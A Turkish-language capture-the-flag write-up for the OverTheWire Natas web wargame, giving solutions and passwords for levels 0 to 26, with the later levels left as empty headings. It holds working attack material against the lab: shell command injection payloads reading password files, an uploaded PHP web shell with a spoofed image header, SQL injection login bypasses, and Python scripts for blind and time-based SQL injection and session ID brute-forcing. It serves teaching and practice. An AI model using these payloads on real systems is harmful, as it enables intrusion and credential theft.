# NATAS WRITEUP

Natas writeup.

## Natas 0 -> Natas 1

Sayfanın kaynak kodu her zaman çok şey söyler. Kaynak kodda 16. satırdaki yorum satırı.

```html
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

## Level 1 -> Level 2

Bu seviyede sayfaya sağ tıklama engellenmiş. Sayfanın kaynak kodunu görmek için geliştirici araçlarını açabiliriz. Yada sayfanın başına "view-source:" yazarak sayfanın kaynak kodunu görebiliriz.

```html
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

## Level 2 -> Level 3

Natas2 ye giriş yaptıktan sonra bu sayfa bişey olmadığını görüyoruz. Kaynak kodda da doğrudan bi şey yok. Fakat Dikkat edersek 1 pixel boyutunda bir resim var. Bu resmi açtığımızdada bi şey yok. Fakat resmin bulunduğu dizin "files" listelenebilir. Bu dizine girdiğimizde "users.txt" isminde bir dosya buluyoruz. Bu dosyanın içindeki bir satır natas3 şifresi.

```text
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```

## Level 3 -> Level 4

Yine bu sayfada bi şey olmadığını söylüyor. Kaynak koda baktığımızda ise google ın bile bulamayacağını söylüyor. yani "robots.txt" dosyası. robots.txt dosyasına girdiğimizde izin verilmeyen bir dizin olduğunu görüyoruz. "/s3cr3t/" dizini. Bu dizine girdiğimizde bir "users.txt" dosyası, bu dosyadada natas4 için şifre mevcut.

```text
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

robots.txt dosyası hakkında daha fazla bilgi için google da araştırma yapabilirsiniz.

## Level 4 -> Level 5

Seviyeye girdiğimizde sadece [http://natas5.natas.labs.overthewire.org][1] adresinden gelen kullanıcıların kabul edileceğini söylüyor. O zaman get isteğindeki referer bilgisini değiştirmemiz gerekiyor. Referer hangi sayfadan geldiğimizi gösteren, get yada post isteğinde bulunan bir üst bilgidir.

Firefox taryıcısından geliştirici seçeneklerinden ağ penceresinden get isteğine sağ tıklayıp "düzenle ve gönder diyerek" referer bilgisini değiştirebilirsiniz.

```text
natas5: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

## Level 5 -> Level 6

Natas 5 e giriş yaptıktan sonra giriş yapmadığımız uyarısı alıyoru. Bazen web sayfaları giriş bilgisini "cookie" lerde saklarlar. Sayfanın cookie değerlerine baktığımızda "loggedin" diye bir çerez görüyozuz. değeri 0. Bu değeri herhangi bir eklenti kullanarak değiştirebilirsiniz. Ardından sayfayı yeniledikten sonra natas 6 şifresi ekrana gelecektir.

```text
natas6: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

## Level 6 -> Level 7

Bu seviyede input giriş yeri bide sayfanın kaynak kodu var.

```php
<?
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

Kaynak koda baktığımızda bizim gönderdiğimiz `secret` değişkeni `$secret` ile karşılaştırılıyor. Fakat `$secret` tanımlanmamış. `include` ile başlayan satırdaki dosyaya baktığımızda `$secret` değişkeninin değerini görebiliriz.

[http://natas6.natas.labs.overthewire.org/includes/secret.inc][2] adresine gittiğimizde dosyayı görebiliriz.

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Natas7 için şifre:

```text
natas7: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

## Level 7 -> Level 8

Sanfanın url kısmını incelediğimizde "index.php?page=home" kısmı oldukça ilginç geliyor. ? ile bir sayfa sorgulanıyor. Yani sunucudaki herhangi bir dosyayı görüntüleyebiliriz.

Ayrıda sayfanın kaynak koduna baktığımızda natas8 şifresinin "/etc/natas_webpass/natas8" dosyasında olduğunu görüyoruz. O zaman bu dosyayı sorgulayabiliriz. "index.php?page=/etc/natas_webpass/natas8" şeklinde urlyi düzenleyerek natas 8 şifresini görebiliriz.

```text
natas8: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

## Level 8 -> Level 9

Bu seviyede "view soursecode" kısmındaki php kodunu incelediğimizde bizim gönderdiğimiz verinin bir işlemden geçirilerek karşılaştırıldığını görüyoruz.

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

// girdiğimiz veri bu fonksiyonda işleme sokuluyor.
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

`encodeSecret()` fonksiyonunun tersini `$encodedSecret` değişkenine uygularsak, sonucu bulabiliriz.

```php
<php
echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));
>
```

Bu kodun sonucu bize girmemiz gereken kodu verecek. Bu kodda: "oubWYf2kBq". Ardından natas9 şifresi ekranda.

```text
natas9: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

## Level 9 -> Level 10

Php kodunu incelediğimizde aradığımız değer `needle` içinde saklanıyor. Bu değişkeni boş girmediğimizde `dictionary.txt` dosyasında aranıyor ve sonuç ekranda gösteriliyor. Bu arama işlemi shell tarafından yapılıyor. Ayrıca girdiğimiz değerler kontrol edilmeden işleme alınıyor. Yani sunucu üzerinde istediğimiz kodu çalıştırabiliriz.

 ```php
 <?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

`grep -i $key dictionary.txt` incelediğimizde `$key` değişkenine `biseyler; ls -al #` gibi bir şey girersek php dosyasının olduğu dizini görebiliriz. Bunun gibi hayal gücümüzü kullanarak istediğimiz komutu çalıştırabiliriz.

Uzatmadan `aaa; cat /etc/natas_webpass/natas10 #` gibi bi şey girerek natas 10 şifresine ulaşabiliriz.

```text
natas10: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

## Level 10 -> Level 11

Bir önceki seviyedeki gibi fakat bash metakarakterleri filtrelenmiş. `; & |` gibi karakterler filtreli. Demek oluyor ki ya başka bir karakter bulacağız yada bu karakterleri kullanmadan şifreyi alacağız.

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

`grep -i $key dictionary.txt` deki `$key` yerine "/etc/natas_webpass/natas11" dosyasında arama yapmasını sağlayacak bir girdi verebiliriz. O zaman girdimiz `. /etc/natas_webpass/natas11 #` gibi bir şey olabilir. Nokta bashte herhangi bir karakter demektir.

```text
natas11: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

## Level 11 -> Level 12

Bu seviye biraz sor şifrelemesi açığını bilmek gerektiriyor. Xor şifrelemesi ile ilgili bilgiye [sadi evren seker][3] in blog postundan ulaşabilirsiniz. Bu şifrelemenin barındırdığı açığa ilgili bilgiyede [buradaki][4] wikiperia sayfasından ulaşabilirsiniz.

Şifreleme işlemini yapan fonksiyon aşağıda:

```php
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
```

Xor işlemi ile ilgili şunu biliyoruz.

* A xor B = C
* A xor C = B
* B xor C = A

Şifreleme algoritmasını dikkate aldığımızda `plaintext xor key = ciphertext` ise o zaman `plaintext xor ciphertext = key` olması gerekmez mi? Yani bizim cookie miz ile php kodundaki `$defaultdata` yı xor işlemine tabi tutarsak anahtarı bulmuş oluruz. Eğer rengi değiştirdiyseniz `$defaultdata` daki bgcolor değerinede girdiğiniz rengi yazmanız gerekir.

```php
function xor_encrypt($in) {
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

// Bu kodun çıktısı bize keyi verecek
echo xor_encrypt(base64_decode($cookie));
```

Bu kodun çıktısı `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq` gibi bir şey olacak. Tekrar eden dize bizim keyimiz. Key değerini bulduk: `qw8J`.

Artık key ile istediğimiz değeri işleme alarak yeni cookie değerimizi bulabiliriz. Yani amacımız `showpassword` değerini "yes" olarak değiştirmek.

```php
function xor_encrypt($in) {
    $key = "qw8J";
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

// yeni cookie değerimiz ekrana gelecek.
echo base64_encode(xor_encrypt(json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"))));
```

Yeni cookie değerimiz: `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`. Bu değeri geliştirici seçeneklerinden javascript konsolundan şu şekilde değiştirebiliriz:  
`document.cookie="data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"`

```text
natas12: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```

## Level 12 -> Level 13

Sayfanın kaynak kodunu incelediğimizde `genRandomString()` fonksiyonu 10 karakter uzunluğunda rastgele bir string üretiyor. `makeRandomPath()` ve `makeRandomPathFromFilename()` yüklediğimiz dosya için bir isim ve dizin oluşturuyor. if bloğunda ise; eğer biz port metodu ile bir dosya gönderirsek bu dosyayı upload/ dizinine rastgele bir isimle kaydediyor.

Normal koşullarda yüklememiz gereken dosya jpg dosyası. Bunu sayfanın kaynak kodundaki `<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />` satırından anlayabliyoruz. Eğer biz resim dosyası yerine php dosyası yüklemek istesek? O zaman geliştirici seçeneklerinden sayfanın bu kısmına midahale edeceğiz. Geliştirici araçlarından dosya uzantısını php olarak değiştirin. ardından sisteme istediğiniz php dosyasını yükleyebilirsiniz. Ben kısaca natas13 şifresini ekrana basan şu php kodunu yükleyerek seviyeyi atladım:

```php
<?php
echo system("cat /etc/natas_webpass/natas13");
?>
```

Buna benzer bi kodla size natas13 şifresini ekrana basabilirsiniz.

```text
natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

## Level 13 -> Level 14

Bir önceki seviyedeki ile aynı fakat bu sefer yüklediğimiz dosyalar üzerinde daha fazla kontrol var. `exif_imagetype($_FILES['uploadedfile']['tmp_name'])` fonksiyonu ile yüklediğimiz dosyalar magic byte kontrolünden geçiyor. Magic byte her dosyanın başında  bulunan ve dosyanın türünü gösteren birkaç byte dir. İnternetten araştırarak magicbyte ile ilgili daha fazla bilgiye ulaşabilirsiniz.

[Buradaki][5] formu inceleyerek fonksiyon hakkında daha fazla bilgi alabilir ve bu fonksiyonu nasıl bypass edebileceğinizi anlayabilirsiniz. Bu formdaki python kodunu kullanarak gerekli dosyayı oluşturdum ve sisteme yükleyerek natas14 şifresini elde ettim.

```python
f = open('shell.php','w')
# \x ile başlayan karakterler jpg magicbytleri.
f.write('\xFF\xD8\xFF\xE0' + '<? system("cat /etc/natas_webpass/natas14"); ?>')
f.close()
```

Programı çalıştırıp oluşan dosyayı sisteme yükleyerek şifreyi alabilirsiniz.

```text
natas14: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

## Level 14 -> Level 15

Bu seviye SQLinjection ile ilgili. SQLinjection kullanıcıdan gelen verinin kontrol edilmeden doğrudan sql sorgusuna dahil edilmesinden delayı kaynaklanır. Kullancı sqlde metakarakterker girerek sql sorgusunu değiştirebilir. Bu sayede veritabanından bilgi çekebilir yada sql sorgusunun sunucunun doğru(True) dönmesini sağlayabilir. İnternette araştırarak SQLinjection ile ilgili daha ayrıntılı bilgi edinebilirsiniz.

Soruya dönecek olursak giriş yapmamızı istiyor. Kaynak kodu incelersek girdiğimiz verilerin kontrol edilmeden kullanıldığını görüyoruz.

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

Buradaki sql sorgusuna müdahale etmemiz gerek. O zaman kullanıcı adını `biseyler"` gibi bir şey ile değiştirirsek sql sorgusunu çifttırnak ile değiştirmiş oluruz. sorgunmuz `SELECT * from users where username="biseyler""...` (... sorgunun devamı demek. Hepsini yazmamı beklemediniz değil mi:\) ) şeklinde değişir. Yani araya çifttırnak ekledik. `biseyler" or 1=1` gibi bir şey girersek sorgumuz ``SELECT * from users where username="biseyler" or 1=1"...` heline gelir. `or 1=1` ile sorgumuzun sonucunun True gelmesini sağladık. Ama bi sorun var ikinci çifttırnak sorguda syntax hatasına yol açar. Bunu çözmek için yorum satırı ekleyebiliriz. `#` sql de yorum satırı demektir. Girdimiz `biseyler" or 1=1 #` şeklide olursa sql sorgumuzun son hali:

```sql
SELECT * from users where username="biseyler" or 1=1 #" and passowrd="biseyler"
```

`#` dan sonraki yorum satırı olduğu için dikkate alınmayacak ve sorgumuzun sonucu doğru dönecek. Şifreye ihtiyacımız olmadan giriş yaptık.

```natas15
natas15: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

## Level 15 -> Level 16

Bu seviyedeki php kodunu incelediğimizde "blind sql injection" olduğunu görebiliriz. Yani sql cıktısını bize geri döndermiyor. Fakat yinede çıktıdan doğru sql sorgusu ile bir şeyler yapabiliriz.

```php
<?
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```

sayfadaki girdiye natas16 yazdığımızda kullanıcının olduğunu görüyoruz. Sorguyu şu şekilde yaparsak parola ile ilgili bilgi alabiliriz. `natas16" AND password LIKE "%a%" #`. Burada parola içinde 'a' karakterinin geçtiğini yada geçmediğini anlayabiliriz. Eğer bütün karakterler için bu işlemi yaparsak şifrenin hangi karakterlerden oluştuğunu buluruz. Daha sonra bu karakterler ile bruteforce yaparak şifreyi elde edebiliriz.

Bruteforce saldırısı için python scripti yazabiliriz. Bu script için requests modülünü kullandım. Aşağıdaki python kodu 2 aşamadan oluşuyor:

* Aşama 1: Şifrenin ilerdiği karakterlerin bulunması. Bu aşama ile bruteforce saldırı süresini önemli ölçüde kısaltırız.
* Aşama 2: Bulunan karakterler ile bruteforce saldırısı yap.

```python
import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''

for char in chars:
    Data = {'username' : 'natas16" AND password LIKE "%' + char + '%" #'} # request ile gönderilecek parametre
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
    if 'exists' in r.text:  # eğer kullanıcı mevcutsa.
        filtered +=  char  ## kullanıcı mevcutsa karakteri ekler.
        print(filtered)

for i in range(0,32):  # password 32 haneli
    for char in filtered:  #bulunan karakterlerde dolaş. bruteforce saldırısını kolaylaştırır.
        Data = {'username' : 'natas16" AND password LIKE "' + passwd + char + '%" #'}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
        if 'exists' in r.text : # şifrenin bir sonraki henesini bulur.
            passwd += char
            print(passwd)
            break
```

Bu script için requests modülünü kullandım. İşte natas16 şifresi:

```text
natas16: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

## Level 16 -> Level 17

Çalıştırılan bash kabuğuna giren girdi güvenlik filtresinden geçiyor. Bu yüzden bir çok meta karakteri kullanamıyoruz.

```php
<?
    $key = "";

    if(array_key_exists("needle", $_REQUEST)) {
        $key = $_REQUEST["needle"];
    }

    if($key != "") {
        if(preg_match('/[;|&`\'"]/',$key)) {
            print "Input contains an illegal character!";
        } else {
            passthru("grep -i \"$key\" dictionary.txt");
        }
    }
?>
```

Bu soru için subshell den yararlanabiliriz. $() gibi bir yapısı var. Bir önceki sevideki mantık ile aynı. Eğer `/etc/natas_webpass/natas17` dosyasındaki karakterleri sırayla bulabiliriz. Ve bu karakterleri bruteforce için kullanabiliriz.

`doomed$(grep a /etc/natas_webpass/natas17)` şeklinde bir girdi ile karakterleri bulabiliriz. `$()` içindeki komut bir çıktı üretir ve bu çıktıyı komuta ekler. Eğer aradığımız karakter natas17 dosyasında var ise bunu 'doomed' in sonuna ekler. Yani eğer bir şey bulursa şifreyi 'doomed!' in sonuna ekleyecek ve php kodundaki `grep` bir sonuç döndürmeyedek. bu sayede biz bir karakter natas17 dosyasında var mı yok mu anlayacağız. Eğer varsa bir sonuç döndürmeyecek, eğer yoksa döndürecek.

Bruteforce saldırısı için python scripti yazabiliriz. Bu script için requests modülünü kullandım. Aşağıdaki python kodu 2 aşamadan oluşuyor:

* Aşama 1: Şifrenin ilerdiği karakterlerin bulunması. Bu aşama ile bruteforce saldırı süresini önemli ölçüde kısaltırız.
* Aşama 2: Bulunan karakterler ile bruteforce saldırısı yap.

```python
import requests  
from requests.auth import HTTPBasicAuth  
  
auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')  # giriş doğrulaması
  
filteredchars = ''  
passwd = ''  
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

for char in allchars:  # karakterleri sırayla dolaş.
    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)  

    if 'doomed' not in r.text:  # bulunan karakteri ekle. yani şifrede olan karakteri.
        filteredchars = filteredchars + char  
        print(filteredchars)  
  
for i in range(32):   # şifre 32 karakter.
    for char in filteredchars:  # bulunan karakterler ile bruteforce saldırısı yap.
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)', auth=auth)  

        if 'doomed' not in r.text:  # eğer bir sonuç yoksa karakteri şifreye ekle sonra yeni karaktere geç.
            passwd = passwd + char  
            print(passwd)  
            break
```

İşte natas17 şifresi:

```text
natas17: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

## Level 17 -> Level 18

```php
<?

    /*
    CREATE TABLE `users` (
    `username` varchar(64) DEFAULT NULL,
    `password` varchar(64) DEFAULT NULL
    );
    */

    if(array_key_exists("username", $_REQUEST)) {
        $link = mysql_connect('localhost', 'natas17', '<censored>');
        mysql_select_db('natas17', $link);

        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
        if(array_key_exists("debug", $_GET)) {
            echo "Executing query: $query<br>";
        }

        $res = mysql_query($query, $link);
        if($res) {
        if(mysql_num_rows($res) > 0) {
            //echo "This user exists.<br>";
        } else {
            //echo "This user doesn't exist.<br>";
        }
        } else {
            //echo "Error in query.<br>";
        }

        mysql_close($link);
    } else {
?>
```

Bu seviyede biz ne girersek girelim bir çıktı varmiyor. Zaten php kodunu inceleyerek bunu anlayabiliriz. O zaman ne yapacağız? Sql de çalışmayı duraklatan bir fonksiyon var: `sleep()`. Bu fonksiyonu kullanarak yanıtın gelme süresine göre çıkarım yapabiliriz. Sql sorgusunu şu hale getirirsek `SELECT * FROM users WHERE username="natas18" AND sleep(5)` yanıt 5 en az 5 saniye sonra gelecek. Çünkü sunucuda sql sorgusu 5 saniye duraklatılıyor. Sorguyu biraz daha geliştirirsek: `SELECT * FROM users WHERE username="natas18" AND password LIKE BINARY "%a%" sleep(5)` şifrenin içinde a bulunması halinde cevap bize 5 saniye sonra gelecek. basit bir python scripti ile bu işlemi hemen yapabiliriz. Script aşağıda.

```python
import requests
from requests.auth import HTTPBasicAuth

allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
filteredchars = ""
passwd = ""

# post formu olduğu için bu header gerekli
headers = {'content-type': 'application/x-www-form-urlencoded'}
Auth = HTTPBasicAuth("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")

for char in allchars: # karakterleri dolaş ve şifredeki karakterleri bul.
    payload = 'username=natas18" AND password LIKE BINARY "%{}%" AND sleep(2) #'.format(char) # 2 saniye bekle
    r = requests.post('http://natas17.natas.labs.overthewire.org/index.php',data=payload, auth=Auth, headers=headers)
    if (r.elapsed.seconds >= 2): # eğer cevap 2 saniyeden sonra gelirse şifrede o karakter var demektir.
        filteredchars += char # karakteri ekle
        print(filteredchars)
print("filteredchars: "+filteredchars)

for _ in range(32):
    for chr in filteredchars:
        payload = 'username=natas18" AND password LIKE BINARY "{}%" AND sleep(2) #'.format(passwd+chr)
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', data=payload, auth=Auth, headers=headers)
        if r.elapsed.seconds >= 2: # eğer 2 saniyeden büyükse şifreye o karakteri ekle.
            passwd += chr
            print(passwd)
            break  # gereksiz deneme yapmaktan kurtarır.
print("password: "+passwd)
```

```text
natas18: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

## Level 18 -> Level 19

Bu seviyedeki php kodunu incelediğimizde `$_SESSION["admin"]` değerini php kodu içinden değiştirmek mümkün değil. Bu yüzden başka bir yol izlememiz gerekiyor. Php sessionlar ile ilgili daha ayrıntılı bilgiyi [buradan](http://php.net/manual/tr/intro.session.php) bulabilirsiniz.

Toplamda 640 tane session var ve bunlardan biri admin için ayrılmış olmak zorunda. Bu yüzden tek yapmamız gereken admine ait session değerini bulmak. Bunu tek tek cookie değerini değiştirerek yapabiliriz. Bunun için 10 satırlık bir python scripti hazırladım. tek yaptığım şey session değerini 640 a kadar denemek. İşte script:

```python
import requests
from requests.auth import HTTPBasicAuth

Auth = HTTPBasicAuth("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")
for _i in range(640):  # 0 dan 640 a kadar olan bütün session ları dene
    r = requests.get("http://natas18.natas.labs.overthewire.org/index.php?debug", auth=Auth, cookies={"PHPSESSID": str(_i)})
    if not "regular" in r.text:  # eğer admin sağlanırsa işlem bitti.
        print("found: ", _i)
        continue
    print(_i)
```

Natas 19 için şifre:

```text
natas19: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
```

## Level 19 -> Level 20

Bu seviyede session değerlerinin sıralı olmadığını söylüyor. Zaten cookie değerlerini incelediğimizde (defalarca kez giriş yaparak) bunu farkedebiliriz.

Cookileri biraz daha dikkatli incelersek değerlerin a-f ve 0-9 arasında değiştiğini görürüz. o zaman bu bir hex olabilir. İnternetten herhangi bir "hex to text" dönüşümü yapan bir siteye girip cookie değerini hex den text e dönüştürdüğünüzde "123-kullaniciadi" biçiminde '-' karakteri ile ayrılmış şekilde bir sayı ve girdiğimiz kullanıcı adını görürüz. Buradaki sayı 0 ile 640 arasında olacak. O zaman yapmamız gereken tek şey buradaki sayı değerlerini değiştirip hex dönüşümü yaparak cookie değerlerini değiştirmek. Bu iş için basit bir python scripti:

```python
import requests
from requests.auth import HTTPBasicAuth

Auth = HTTPBasicAuth("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")
for _i in range(640):
    ses = str(_i)+"-admin"  # hex dönüşümü için text hazırla
    session = ses.encode("utf-8").hex()  # metni hexe dönüştür.
    r = requests.post("http://natas19.natas.labs.overthewire.org/index.php?debug", auth=Auth,
                    cookies={"PHPSESSID": session}, headers={"Content-Type":"application/x-www-form-urlencoded"}, data={"username":"admin", "password":"admin"})  # bilgileri gir ve cookie değerine bulduğumuz hex değerini gir.
    if not "regular" in r.text:
        print("found: ", session)  # admin için cookie session değerini göster.
        break
    print(session)
```

İşte natas20 şifresi:

```text
natas20: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
```

## Level 20 -> Level 21

```text
natas21: IFekPyrQXftziDEsUr3x21sYuahypdgJ
```

## Level 21 -> Level 22

Bu seviyede 2 sayfa var. 1. sayfa giriş sayfası ve burada 2. sayfanın linki var. 2. sayfada ise css üzerinde değişiklik yapmamıza imkan tanıyan bir form var. Her 2 sayfadaki php kodlarını incelediğimizde 2. sayfadan girdiğimiz değerlerin sessiona kaydedildiğini görüyoruz.

```php
// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
        $val = $_SESSION[$key];
    } else {
        $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
```

İkinci sayfadaki php kodlarında veriler kontrol edilmeden doğrudan kaydediliyor. Peki ya bir bir veri fazla göndererek "admin" değerini 1 yapamazmıyız. Elbette yapabiliriz. Tarayıcıda F12 ile geliştirici araçlarına girdikten sonra formun sonuna submit butonundan önce şöyle bir şey eklersek session üzerinde istediğimiz değişikliği yapmış oluruz.

```html
<input name="admin" value=1>
```

Bu sayede "admin" session değerini 1 yaparız. Elbette bu 1. sayfada geçerli olmayacak. 2. sayfadaki cookie değerini 1. sayfadaki ile değiştirdikten sonra sayfayı yenileyerek şifreyi alabiliriz.

Yaptığımız şey for ile extra bir veri göndererek session a kaydetmek.

```text
natas22: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```

## Level 22 -> Level 23

```php
<?
    session_start();

    if(array_key_exists("revelio", $_GET)) {
        // only admins can reveal the password
        if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
        header("Location: /"); //302 yönlendirmesi yapılıyor.
        }
    }
?>
```

Bu sayfadaki php kodunu incelediğimizde `revelio` flagini verdiğimiz taktirde anasayfaya yönlendiriliyoruz. Bu yönlendirme 302 yönlendirmesi. Tarayıcılar normalde bu yönlendirmeleri otomatik olarak takip ederler. Bizim yapmamız gereken bu yönlendirmeyi takip etmemek. Bu sayfayı burpsuite ile açarak yapabiliriz. yada `curl` komutu ile yapabiliriz.

```bash
curl --user natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ http://natas22.natas.labs.overthewire.org/?revelio
```

Diğer bir yöntem ise burpsuite kullanarak yapmaktır. Burpsuite ile siteye gittiğinizde sayfanın kaynak kodu ile beraber şifreyide verecektir.

```text
natsas23: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
```

## Level 23 -> Level 24

> php string int karşılaştırma. başına sayı ekleme

```text
natas24: OsRmXFguozKpTZZ5X14zNO43379LZveg
```

## Level 24 -> Level 25

> php strcmp() açıklığı. dizi geçirme.

```text
natas25: GHF6X7YwACaYYssHVY05cFq83hRktl4c
```

## Level 25 -> Level 26

user agent ile php kodu yükleme

```text
natas26: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
```

## Level 26 -> Level 27

```text
natas26: 
```

## Level 27 -> Level 28
## Level 28 -> Level 29
## Level 29 -> Level 30
## Level 30 -> Level 31
## Level 31 -> Level 32
## Level 32 -> Level 33

[1]: (http://natas5.natas.labs.overthewire.org)
[2]: (http://natas6.natas.labs.overthewire.org/includes/secret.inc)
[3]: (http://bilgisayarkavramlari.sadievrenseker.com/2009/04/20/yahut-sifrelemesi-xor-encryption/)
[4]: (http://www.wiki-zero.co/index.php?q=aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvS25vd24tcGxhaW50ZXh0X2F0dGFjaw)
[5]: https://stackoverflow.com/questions/18357095/how-to-bypass-the-exif-imagetype-function-to-upload-php-code
